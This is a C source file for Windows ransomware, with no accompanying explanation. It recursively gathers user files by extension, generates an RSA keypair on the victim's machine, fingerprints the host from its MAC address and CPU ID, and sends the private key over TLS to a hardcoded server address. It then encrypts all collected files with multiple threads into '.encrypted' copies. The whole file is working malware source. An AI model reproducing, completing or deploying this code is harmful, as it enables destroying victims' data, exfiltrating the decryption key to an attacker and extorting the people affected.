#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <stdbool.h>
#include <lmcons.h>
#include <time.h>

// Added for sending data
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/aes.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

#define SERVER "10.10.10.10"
#define PORT 443
// end

// Added for unique user ID
#include <iphlpapi.h>
#include <intrin.h>

#pragma comment(lib, "iphlpapi.lib")
// end

#if defined(_WIN32)
#include <windows.h>
#define get_num_cores() (int)GetActiveProcessorCount(ALL_PROCESSOR_GROUPS)
#else
#include <unistd.h>
#include <sys/sysinfo.h>
#define get_num_cores() get_nprocs()
#endif

const char* check_os() {
#if defined(_WIN32)
    return "Windows";
#elif defined(__APPLE__) && defined(__MACH__)
    return "macOS";
#elif defined(__linux__)
    return "Linux";
#elif defined(__unix__)
    return "Unix";
#elif defined(_POSIX_VERSION)
    return "POSIX-compliant";
#else
    return "Unknown OS";
#endif
}

#define AES_BLOCK_SIZE 16

typedef struct {
    char **file_paths;
    int start;
    int end;
    const char *public_key;
} ThreadData;

void encrypt_file(const char *file_path, const char *public_key);
void *encrypt_files_thread(void *arg);

void encrypt_files(char **file_paths, int file_count, const char *public_key) {
    int num_cores = get_num_cores();
    int num_threads = (int)(num_cores * 0.6);
    if (num_threads < 1) num_threads = 1;

    pthread_t threads[num_threads];
    ThreadData thread_data[num_threads];

    int files_per_thread = file_count / num_threads;
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].file_paths = file_paths;
        thread_data[i].public_key = public_key;
        thread_data[i].start = i * files_per_thread;
        thread_data[i].end = (i == num_threads - 1) ? file_count : (i + 1) * files_per_thread;
        pthread_create(&threads[i], NULL, encrypt_files_thread, (void *)&thread_data[i]);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

void *encrypt_files_thread(void *arg) {
    ThreadData *data = (ThreadData *)arg;

    for (int i = data->start; i < data->end; i++) {
        encrypt_file(data->file_paths[i], data->public_key);
    }

    return NULL;
}

void encrypt_file(const char *file_path, const char *public_key) {
    FILE *input_file = fopen(file_path, "rb");
    if (!input_file) {
        return;
    }

    // printf("Encrypting file: %s\n", file_path);

    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    unsigned char *input_data = (unsigned char *)malloc(file_size);
    fread(input_data, 1, file_size, input_file);
    fclose(input_file);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(input_data);
        return;
    }

    unsigned char *encrypted_key = NULL;
    int encrypted_key_len = 0;
    unsigned char iv[AES_BLOCK_SIZE];

    if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
        free(input_data);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    EVP_PKEY *pkey = NULL;
    BIO *bio = BIO_new_mem_buf(public_key, -1);
    PEM_read_bio_PUBKEY(bio, &pkey, NULL, NULL);
    BIO_free(bio);

    if (EVP_SealInit(ctx, EVP_aes_128_cbc(), &encrypted_key, &encrypted_key_len, iv, &pkey, 1) != 1) {
        free(input_data);
        EVP_PKEY_free(pkey);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char *output_data = (unsigned char *)malloc(file_size + AES_BLOCK_SIZE);
    int output_len = 0, len = 0;

    if (EVP_SealUpdate(ctx, output_data, &len, input_data, file_size) != 1) {
        free(input_data);
        free(output_data);
        EVP_PKEY_free(pkey);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    output_len = len;

    if (EVP_SealFinal(ctx, output_data + len, &len) != 1) {
        free(input_data);
        free(output_data);
        EVP_PKEY_free(pkey);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    output_len += len;

    EVP_CIPHER_CTX_free(ctx);
    EVP_PKEY_free(pkey);

    char output_file_path[256];
    snprintf(output_file_path, sizeof(output_file_path), "%s.encrypted", file_path);

    FILE *output_file = fopen(output_file_path, "wb");
    if (!output_file) {
        free(input_data);
        free(output_data);
        return;
    }

    fwrite(encrypted_key, 1, encrypted_key_len, output_file);
    fwrite(iv, 1, AES_BLOCK_SIZE, output_file);
    fwrite(output_data, 1, output_len, output_file);
    fclose(output_file);

    free(input_data);
    free(output_data);
    OPENSSL_free(encrypted_key);
}

const char* EXCLUDED_DIRECTORIES[] = {
    "C:\\Windows",
    "C:\\Users\\%s\\AppData",
    "C:\\Users\\%s\\AppData\\Local",
    "C:\\Windows\\\\System32",
    "C:\\Windows\\\\WinSxS",
    "C:\\Windows\\\\assembly",
    "C:\\Windows\\\\SystemApps",
    "C:\\Windows\\\\SysWOW64",
    "C:\\Windows\\\\Sysnative",
    "C:\\Windows\\Installer",
    "C:\\Windows\\AppCompat",
    "C:\\Windows\\\\servicing",
    "C:\\Windows\\\\Microsoft.NET",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "C:\\ProgramData"
    "C:\\Windows\\System32",
    "C:\\Windows\\SysWOW64",
    "C:\\Windows\\WinSxS",
    "C:\\Windows\\assembly",
    "C:\\Windows\\SystemApps",
    "C:\\Windows\\Sysnative"
};

const char* TARGET_EXTENSIONS[] = {
    ".txt",
    ".docx",
    ".pdf",
    ".jpg",
    ".png",
    ".mp4",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".zip",
    ".rar",
    ".7z",
    ".tar",
    ".gz",
    ".sql",
    ".mdb",
    ".accdb",
    ".psd",
    ".ai",
    ".indd",
    ".csv",
    ".xml",
    ".html",
    ".php",
    ".asp",
    ".aspx",
    ".js",
    ".css",
    ".json",
    ".c",
    ".cpp",
    ".h",
    ".java",
    ".py",
    ".rb",
    ".go",
    ".swift",
    ".sh",
    ".bat",
    ".exe",
    ".dll",
    ".doc",
    ".xlsm",
    ".xltx",
    ".xltm",
    ".pptm",
    ".dotx",
    ".dotm",
    ".potx",
    ".potm",
    ".vsd",
    ".vsdx",
    ".pub",
    ".odt",
    ".ods",
    ".odp",
    ".odg",
    ".odf"
};

char** file_paths = NULL;
int file_count = 0;

bool is_system_directory(const char* path) {
    for (int i = 0; i < sizeof(EXCLUDED_DIRECTORIES) / sizeof(EXCLUDED_DIRECTORIES[0]); i++) {
        if (_stricmp(path, EXCLUDED_DIRECTORIES[i]) == 0) {
            return true;
        }
    }
    return false;
}

bool has_target_extension(const char* file_name) {
    const char* dot = strrchr(file_name, '.');
    if (dot) {
        if (strcmp(dot, ".encrypted") == 0) {
            return false;
        }
        for (int i = 0; i < sizeof(TARGET_EXTENSIONS) / sizeof(TARGET_EXTENSIONS[0]); i++) {
            if (_stricmp(dot, TARGET_EXTENSIONS[i]) == 0) {
                return true;
            }
        }
    } 
    return false;
}

void add_file_path(const char* file_path) {
    file_paths = (char**)realloc(file_paths, (file_count + 1) * sizeof(char*));
    if (file_paths != NULL) {
        file_paths[file_count] = strdup(file_path);
        file_count++;
    }
}

void enumerate_files(const char* directory, const char* exe_path) {
    if (is_system_directory(directory)) {
        return;
    }

    WIN32_FIND_DATA find_data;
    HANDLE hFind;
    char search_path[MAX_PATH];

    snprintf(search_path, MAX_PATH, "%s\\*", directory);
    hFind = FindFirstFile(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        char file_path[MAX_PATH];
        snprintf(file_path, MAX_PATH, "%s\\%s", directory, find_data.cFileName);

        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        if (strcmp(file_path, exe_path) == 0) {
            continue;
        }

        if (is_system_directory(file_path)) {
            continue;
        }

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            enumerate_files(file_path, exe_path);
        } else {
            if (has_target_extension(find_data.cFileName)) {
                // printf("Found file: %s\n", file_path);
                add_file_path(file_path);
            }
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

void generate_rsa_keypair(char **pub_key, char **priv_key, int bits) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *ctx = NULL;
    BIO *pub_bio = NULL, *priv_bio = NULL;

    // Create a context for the key generation
    ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    if (ctx == NULL) {
        fprintf(stderr, "Failed to create context for key generation.\n");
        return;
    }

    // Initialize the context for RSA key generation
    if (EVP_PKEY_keygen_init(ctx) <= 0) {
        fprintf(stderr, "Failed to initialize keygen context.\n");
        EVP_PKEY_CTX_free(ctx);
        return;
    }

    // Set the RSA key length
    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, bits) <= 0) {
        fprintf(stderr, "Failed to set RSA key length.\n");
        EVP_PKEY_CTX_free(ctx);
        return;
    }

    // Generate the RSA key pair
    if (EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        fprintf(stderr, "Failed to generate RSA key pair.\n");
        EVP_PKEY_CTX_free(ctx);
        return;
    }

    // Create BIO for public key
    pub_bio = BIO_new(BIO_s_mem());
    if (PEM_write_bio_PUBKEY(pub_bio, pkey) != 1) {
        fprintf(stderr, "Failed to write public key to BIO.\n");
    }

    // Create BIO for private key
    priv_bio = BIO_new(BIO_s_mem());
    if (PEM_write_bio_PrivateKey(priv_bio, pkey, NULL, NULL, 0, NULL, NULL) != 1) {
        fprintf(stderr, "Failed to write private key to BIO.\n");
    }

    // Get the public key from BIO
    BUF_MEM *pub_buffer;
    BIO_get_mem_ptr(pub_bio, &pub_buffer);
    *pub_key = malloc(pub_buffer->length + 1);
    BIO_read(pub_bio, *pub_key, pub_buffer->length);
    (*pub_key)[pub_buffer->length] = '\0'; // Null-terminate the string

    // Get the private key from BIO
    BUF_MEM *priv_buffer;
    BIO_get_mem_ptr(priv_bio, &priv_buffer);
    *priv_key = malloc(priv_buffer->length + 1);
    BIO_read(priv_bio, *priv_key, priv_buffer->length);
    (*priv_key)[priv_buffer->length] = '\0'; // Null-terminate the string

    // Clean up
    BIO_free_all(pub_bio);
    BIO_free_all(priv_bio);
    EVP_PKEY_free(pkey);
    EVP_PKEY_CTX_free(ctx);
}

void handle_openssl_error() {
    ERR_print_errors_fp(stderr);
    abort();
}

void encrypt_aes(const unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext, int *ciphertext_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handle_openssl_error();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handle_openssl_error();

    int len;
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handle_openssl_error();

    *ciphertext_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handle_openssl_error();

    *ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
}

char* escape_newlines(const char *str) {
    size_t len = strlen(str);
    size_t new_len = len;
    for (size_t i = 0; i < len; i++) {
        if (str[i] == '\n') {
            new_len++;
        }
    }

    char *escaped_str = (char *)malloc(new_len + 1);
    if (!escaped_str) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (str[i] == '\n') {
            escaped_str[j++] = '\\';
            escaped_str[j++] = 'n';
        } else {
            escaped_str[j++] = str[i];
        }
    }
    escaped_str[j] = '\0';

    return escaped_str;
}

void generate_unique_user_id(char *user_id, size_t size) {
    unsigned char mac[6] = {0};  // Buffer for MAC address
    char cpu_id[256] = {0};      // Buffer for CPU ID

    ULONG outBufLen = sizeof(IP_ADAPTER_ADDRESSES);
    IP_ADAPTER_ADDRESSES *pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);

    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAddresses);
        pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(outBufLen);
    }

    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &outBufLen) == NO_ERROR) {
        if (pAddresses->PhysicalAddressLength == 6) {
            memcpy(mac, pAddresses->PhysicalAddress, 6);
        }
    }

    free(pAddresses);

    // Get CPU ID
    int cpuInfo[4];
    __cpuid(cpuInfo, 0);
    snprintf(cpu_id, sizeof(cpu_id), "%08X%08X%08X%08X", cpuInfo[0], cpuInfo[1], cpuInfo[2], cpuInfo[3]);

    // Generate the unique user ID
    snprintf(user_id, size, "%02X%02X%02X%02X%02X%02X-%s", 
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], cpu_id);
}

#define JSON_BUFFER_SIZE 4096  // Increase the buffer size for JSON data

int main(int argc, const char* argv[]) {
    const char* os = check_os();
    if (strcmp(os, "Windows") == 0 || strcmp(os, "Linux") == 0) {
        
        char exe_path[MAX_PATH];
        GetModuleFileName(NULL, exe_path, MAX_PATH);

        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;

        if (GetUserName(username, &username_len)) {
            const char* paths[] = {
                "D:\\",
                "C:\\Users\\",
                "C:\\Users\\Public\\",
                "C:\\Program Files\\",
                "C:\\Program Files (x86)\\",
                "C:\\Users\\%s\\Documents\\",
                "C:\\Users\\%s\\Pictures\\",
                "C:\\Users\\%s\\Desktop\\",
                "C:\\Users\\%s\\Downloads\\",
                "C:\\Users\\%s\\Videos\\",
                "C:\\Users\\%s\\Music\\",
                "C:\\Windows\\",
                "C:\\Windows\\System32\\",
                "C:\\ProgramData\\"
            };

            char** drives = (char**)malloc((sizeof(paths) / sizeof(paths[0])) * sizeof(char*));

            if (drives == NULL) {
                return 1;
            }

            for (int i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
                drives[i] = (char*)malloc(260 * sizeof(char));
                if (drives[i] != NULL) {
                    snprintf(drives[i], 260, paths[i], username);
                } else {
                    return 1;
                }
            }

            for (int i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
                enumerate_files(drives[i], exe_path);
            }

            if (file_count == 0) {
                return 0;
            }

            char *pub_key = NULL;
            char *private_key = NULL;
            char *userId = (char *)malloc(512);
            if (userId == NULL) {
                perror("Memory allocation failed for userId");
                exit(EXIT_FAILURE);
            } else {
                generate_unique_user_id(userId, 512);
            }
            
            generate_rsa_keypair(&pub_key, &private_key, 2048);

            const char *user_id = userId;
            const char *priv_key = private_key;

            // Escape newlines in priv_key
            char *escaped_priv_key = escape_newlines(priv_key);

            WSADATA wsa_data;
            if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
                perror("WSAStartup failed");
                free(escaped_priv_key);
                exit(EXIT_FAILURE);
            }

            SSL_load_error_strings();
            OpenSSL_add_ssl_algorithms();

            SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
            if (!ctx) handle_openssl_error();

            SSL *ssl;
            SOCKET server_fd;
            struct sockaddr_in server_addr;

            server_fd = socket(AF_INET, SOCK_STREAM, 0);
            if (server_fd == INVALID_SOCKET) {
                perror("Unable to create socket");
                WSACleanup();
                free(escaped_priv_key);
                exit(EXIT_FAILURE);
            }

            // Increase the socket buffer size
            int sock_buf_size = JSON_BUFFER_SIZE;
            setsockopt(server_fd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));
            setsockopt(server_fd, SOL_SOCKET, SO_RCVBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(PORT);
            if (inet_pton(AF_INET, SERVER, &server_addr.sin_addr) <= 0) {
                perror("Invalid address/ Address not supported");
                closesocket(server_fd);
                WSACleanup();
                free(escaped_priv_key);
                exit(EXIT_FAILURE);
            }

            if (connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Connection failed");
                closesocket(server_fd);
                WSACleanup();
                free(escaped_priv_key);
                exit(EXIT_FAILURE);
            }

            ssl = SSL_new(ctx);
            SSL_set_fd(ssl, server_fd);

            if (SSL_connect(ssl) <= 0) handle_openssl_error();

            // Create JSON data manually
            char json_data[JSON_BUFFER_SIZE];
            snprintf(json_data, sizeof(json_data), "{\"userId\":\"%s\",\"privateKey\":\"%s\"}", user_id, escaped_priv_key);

            #define AES_KEY_SIZE 256
            #define AES_BLOCK_SIZE1 16
            // Encrypt JSON data
            unsigned char key[AES_KEY_SIZE / 8] = "12345678901234567890123456789012";  // 32 bytes for AES-256
            unsigned char iv[AES_BLOCK_SIZE1] = "1234567890123456";                    // 16 bytes for AES block size
            unsigned char ciphertext[JSON_BUFFER_SIZE];
            int ciphertext_len;

            encrypt_aes((unsigned char *)json_data, strlen(json_data), key, iv, ciphertext, &ciphertext_len);

            // Send encrypted data
            SSL_write(ssl, ciphertext, ciphertext_len);

            // Clean up
            SSL_shutdown(ssl);
            SSL_free(ssl);
            closesocket(server_fd);
            SSL_CTX_free(ctx);
            EVP_cleanup();
            WSACleanup();
            free(escaped_priv_key);

            encrypt_files(file_paths, file_count, pub_key);

            for (int i = 0; i < file_count; i++) {
                free(file_paths[i]);
            }
            free(file_paths);

            for (int i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
                free(drives[i]);
            }
            free(drives);

            free(pub_key);
        }

        return 0;  
    }

    return 0;
}
